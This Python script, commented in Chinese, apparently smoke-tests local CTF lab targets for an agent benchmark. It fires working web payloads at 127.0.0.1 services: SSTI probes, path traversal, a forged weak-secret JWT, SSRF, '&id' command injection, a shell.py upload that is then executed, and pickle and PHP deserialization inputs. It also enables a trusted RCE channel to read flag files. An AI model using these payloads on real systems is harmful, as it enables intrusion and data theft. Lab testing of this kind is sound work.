"""web-002 ~ web-008 靶机行为冒烟测试：独立验证漏洞真可用（不依赖主 Agent / LLM）。

用法：.venv/Scripts/python.exe scripts/_smoke_web_targets.py
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys

# 让 scripts/ 的兄弟包（sandbox）可 import（直接 python 跑脚本时 cwd 已是 ctf_agent）
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import httpx

SSTI = "http://127.0.0.1:9002/web-002"
UNSER = "http://127.0.0.1:9003/web-003"
TRAV = "http://127.0.0.1:9004/web-004"
JWT = "http://127.0.0.1:9005/web-005"
SSTI_RCE = "http://127.0.0.1:9008/web-008"
CMD_RCE = "http://127.0.0.1:9009/web-009"
UPLOAD_RCE = "http://127.0.0.1:9010/web-010"
UNSER_RCE = "http://127.0.0.1:9011/web-011"
BACKUP = "http://127.0.0.1:9006/web-006"
SSRF = "http://127.0.0.1:9007/web-007"


def _jwt_secret(secret: str, payload: dict) -> str:
    h = base64.urlsafe_b64encode(json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=").decode()
    s = base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{h}.{p}".encode(),
                                          hashlib.sha256).digest()).rstrip(b"=").decode()
    return f"{h}.{p}.{s}"


def main() -> None:
    # 1) SSTI 探测 {{7*7}} -> 49
    r1 = httpx.get(SSTI, params={"name": "{{7*7}}"}, timeout=10)
    print("[SSTI probe] %s" % r1.text[:120])

    # 2) SSTI 泄露 {{ FLAG }} -> flag
    r2 = httpx.get(SSTI, params={"name": "{{ FLAG }}"}, timeout=10)
    print("[SSTI leak]  %s" % r2.text[:120])

    # 3) 反序列化 -> base64 对象含 file=/flag.txt
    obj = 'O:5:"Class":1:{s:4:"file";s:9:"/flag.txt";}'
    data = base64.b64encode(obj.encode()).decode()
    r3 = httpx.get(UNSER, params={"data": data}, timeout=10)
    print("[UNSER]      %s" % r3.text[:120])

    # 4) 路径穿越 -> ../flag.txt
    r4 = httpx.get(TRAV, params={"download": "../flag.txt"}, timeout=10)
    print("[TRAV]       %s" % r4.text[:120])

    # 5) JWT 弱密钥 -> secret 伪造 role=admin
    tok = _jwt_secret("secret", {"user": "admin", "role": "admin"})
    r5 = httpx.get(JWT, headers={"Authorization": f"Bearer {tok}"}, timeout=10)
    print("[JWT]        %s" % r5.text[:120])

    # 6) 备份泄露 -> index.php.bak 含 flag
    r6 = httpx.get(BACKUP + "/index.php.bak", timeout=10)
    print("[BACKUP]     %s" % r6.text[:160])

    # 7) SSRF -> 让靶机回环抓取自身 /flag
    r7 = httpx.get(SSRF, params={"url": "http://127.0.0.1:9007/flag"}, timeout=10)
    print("[SSRF]       %s" % r7.text[:160])

    # 8) SSTI RCE：{{7*7}}->49 证明代码执行；泄漏 {{ FLAG }} 仅诱饵
    r8a = httpx.get(SSTI_RCE, params={"name": "{{7*7}}"}, timeout=10)
    print("[SSTI_RCE probe] %s" % r8a.text[:120])
    r8b = httpx.get(SSTI_RCE, params={"name": "{{ FLAG }}"}, timeout=10)
    print("[SSTI_RCE leak]  %s" % r8b.text[:120])
    # 9) 受信 RCE 通道（需 CTF_AGENT_TRUSTED_RCE=1）读取靶机文件系统 flag
    import os as _os, tempfile as _tf
    _os.environ.setdefault("CTF_AGENT_TRUSTED_RCE", "1")
    from sandbox.trusted_rce import execute_trusted
    _fpath = _os.path.join(_tf.gettempdir(), "ctf_ssti_rce_flag.txt")
    _rce = execute_trusted('type "%s"' % _fpath) if _os.name == "nt" else execute_trusted('cat "%s"' % _fpath)
    print("[SSTI_RCE channel] %s" % _rce[:120])

    # 10) 命令注入 RCE：&id 证明命令执行；受信通道读取靶机文件系统 flag
    r10a = httpx.get(CMD_RCE, params={"cmd": "&id"}, timeout=10)
    print("[CMD_RCE probe] %s" % r10a.text[:120])
    import tempfile as _tf2
    _fpath2 = _os.path.join(_tf2.gettempdir(), "ctf_cmd_rce_flag.txt")
    _rce2 = execute_trusted('type "%s"' % _fpath2) if _os.name == "nt" else execute_trusted('cat "%s"' % _fpath2)
    print("[CMD_RCE channel] %s" % _rce2[:120])

    # 11) 上传 RCE：上传 .py 探针 + /preview 执行证明代码执行；受信通道读 flag
    _up = httpx.post(UPLOAD_RCE + "/upload?name=shell.py",
                     content=b"print('UPLOAD_RCE_OK')", timeout=10)
    print("[UPLOAD_RCE upload] %s" % _up.text[:120])
    _up2 = httpx.get(UPLOAD_RCE + "/preview?name=shell.py", timeout=10)
    print("[UPLOAD_RCE preview] %s" % _up2.text[:120])
    _fpath3 = _os.path.join(_tf2.gettempdir(), "ctf_upload_rce_flag.txt")
    _rce3 = execute_trusted('type "%s"' % _fpath3) if _os.name == "nt" else execute_trusted('cat "%s"' % _fpath3)
    print("[UPLOAD_RCE channel] %s" % _rce3[:120])

    # 12) 不安全反序列化 RCE：恶意 pickle 证明代码执行；受信通道读 flag
    _UNSER_PROOF = "gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwDaW50lJOUjAUzMTMzN5SFlFKULg=="
    _un = httpx.post(UNSER_RCE + "/unserialize", data=_UNSER_PROOF, timeout=10)
    print("[UNSER_RCE] %s" % _un.text[:120])
    _fpath4 = _os.path.join(_tf2.gettempdir(), "ctf_unser_rce_flag.txt")
    _rce4 = execute_trusted('type "%s"' % _fpath4) if _os.name == "nt" else execute_trusted('cat "%s"' % _fpath4)
    print("[UNSER_RCE channel] %s" % _rce4[:120])


if __name__ == "__main__":
    main()
